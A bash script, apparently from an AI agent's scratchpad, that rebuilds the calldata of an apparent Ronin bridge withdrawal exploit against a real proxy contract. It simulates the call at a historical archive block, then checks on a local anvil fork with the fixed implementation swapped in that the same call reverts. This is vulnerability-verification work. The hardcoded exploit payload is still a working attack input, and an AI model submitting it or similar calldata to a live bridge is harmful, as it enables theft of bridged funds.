#!/usr/bin/env bash
set -u
export PATH="$HOME/.foundry/bin:$PATH"
ETH=$(grep -E "^ETH_ARCHIVE_RPC=" /mnt/c/Users/Admin/.bridgesentry.env | cut -d= -f2- | tr -d "\r\n")
PROXY=0x64192819ac13ef72bf6b5ae239ac672b43a9af08
IMPL=0xfc274ec92bbb1a1472884558d1b5caac6f8220ee
FIXED=0x5019d41b0737e39b51fd6da4859f3e27579e4e69
L=http://127.0.0.1:8554
FROM=0x000000000000000000000000000000000000dEaD
FORK=20468847
SP=/mnt/c/Users/Admin/AppData/Local/Temp/claude/8a86b0ff59e97214/da9d8331-f2fe-435a-9476-d57469ed07c9/scratchpad
SIG="submitWithdrawal((uint256,uint8,(address,address,uint256),(address,address,uint256),(uint8,uint256,uint256)),(uint8,bytes32,bytes32)[])"
R="(166633,1,(0x6980a47beE930a4584B09Ee79eBe46484FbDBDD0,0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,1),(0x6980a47beE930a4584B09Ee79eBe46484FbDBDD0,0x0B7007c13325C48911F73A2daD5FA5dCBf808aDc,2020),(0,0,1998046875000))"
S="[(27,0x3312cefb63ba7f22668d507e7a1e4cf018c849f5948a684d7bc8cbeda4c52b5d,0x0007ab06e4d61f68096a4932e3417c30421636df46567af580376cff90246796),(27,0x3269f2188adf0b9dab4567b0380df6d7c7f89620f84055c824bb6e3cec48ecca,0x5601673088f8b82a96f079dee4fa09ec2fe2a1f7671bb118ed71bf9bb8bceab1),(27,0xa7f7c9f635aa92648d5b5aa6170c991533392ee710f90813215be1f56481cd81,0x032e1ec18100bc71ebc691f0b2cde6e3472fe1267418e2d06e58c0b30f24a0f6),(27,0x56eb4d70f88f2328a3b938a16caa20ef17c847896776c775cf819cfdaba9268d,0x410d8608d47c773099ce067a5ce2592c69bfa2c0e795950f24738067b5ba7eef),(27,0xc253fe324c7d7da4e079467c28278dc94a92935859a9ca986a5d56c79d1c9bf6,0x5fee2db9a5d415194151af1a30c62ee9a88fa0a7f8c66b66a1f18399b1136032),(28,0xbbc25e365aeeee1b8639c39729516adbee67e12cb5f8d70c929476d1b5890768,0x6c83316ad318d88b0704a8c17367c9d8cb1135f8b24beab115862d7470bb1b4d),(28,0x7699134b0fd31a27086a4bf6b48503f223e077461b3b5373484e865055789daf,0x595e612fb959c09eeb318a229d39928414366a72adfa0275a01babeeff56ec7c),(27,0xe0a9981266f6028af1d3fcc01af9452e2673244c24f119aefaf31caac76a86b2,0x09cc81dc4a1fed27a030c1c68e03ef63433104aa975f888b2528383164476540),(27,0xb83758b61d1a83a7238654718ed52556b559bf10d5192f9d1605161d035685a9,0x7957bcd3d4ce2bd5f207735121e3a32182284ab249c8e48ed1349456279afb96),(28,0x3c4b3a44c16ca0165b395336230bff778931c0e48064edcebe120045dbb09a63,0x2b8ef74e65b29e315ee526b67f3fc875192345bc84e0c2654ecb8dee42764d62),(28,0x752779dbcd44080266595b3a3ec1e0ef9e0e90f3cd235bab60bc0647e02d9235,0x4f9fd63d17ba1dab73e75c0ec1ed0819b3c3c9642b934f6cf7190681c088d60a),(28,0x4bf045a4b2d31a5f1164efaf3effac3c07e311ee5cd3b0b2d3deae2f41f3a0d7,0x2bcbfa8033d9de282f0cca65af1475aa37d7fd546685c24a77d7c01fae61b6c9),(28,0x0a1ef061bc83e6d4b0d9c2c98ff7aacf1ff46f2d915ab03ff48534761b8f25a4,0x1b5c2f8977d4922bcb798843a42fe284a2c70900b766bca8c46f23747c44acb8),(27,0x33acb5debb3eb4f18277a967c91b7cde84d5ea4877ca6d35328825518dd1fefb,0x160817430f866cc36d2ab79fb546477dc55fc8e2bc47818c585ef32723fa3d32),(28,0xb377fd3c624426b0ef33f110dfc9424e6444f9000e8d4a859cd9102e59834544,0x2e7f1f124b131944db2982c70f5ffc4054326facbbca95f161f3f042b58f52f8),(27,0xc7b333f12435df9a6266f188b7532692351ea2c34c4409b60f907b0aa9ac5366,0x1ad7b9909e95402eeda392e92d2b34e9091bc838f7c92f69c398a630aca4dca9)]"
CD=$(cast calldata "$SIG" "$R" "$S")
printf '%s' "$CD" > "$SP/ronin_usdc_calldata.txt"
echo "USDC calldata len chars: ${#CD}"
echo "=== verify vulnerable (archive @ $FORK, should NOT revert) ==="
cast call $PROXY "$CD" --rpc-url "$ETH" --block $FORK --from $FROM 2>&1 | head -2
# save fixed impl runtime for the patch
cast code $FIXED --rpc-url "$ETH" > "$SP/ronin_fixed_impl_runtime.txt"
echo "fixed impl runtime len chars: $(wc -c < $SP/ronin_fixed_impl_runtime.txt)"
echo "=== patched check: anvil fork + code-overlay, same call should revert ==="
anvil --fork-url "$ETH" --fork-block-number $FORK --port 8554 --silent >/tmp/anvil_usdc.log 2>&1 &
APID=$!; trap 'kill $APID 2>/dev/null' EXIT
for i in $(seq 1 40); do cast block-number --rpc-url $L >/dev/null 2>&1 && break; sleep 1; done
echo "vuln on fork: $(cast call $PROXY "$CD" --rpc-url $L --from $FROM 2>&1 | head -1)"
cast rpc anvil_setCode $IMPL "$(cat $SP/ronin_fixed_impl_runtime.txt)" --rpc-url $L >/dev/null 2>&1
echo "patched (code-overlay): $(cast call $PROXY "$CD" --rpc-url $L --from $FROM 2>&1 | head -1)"
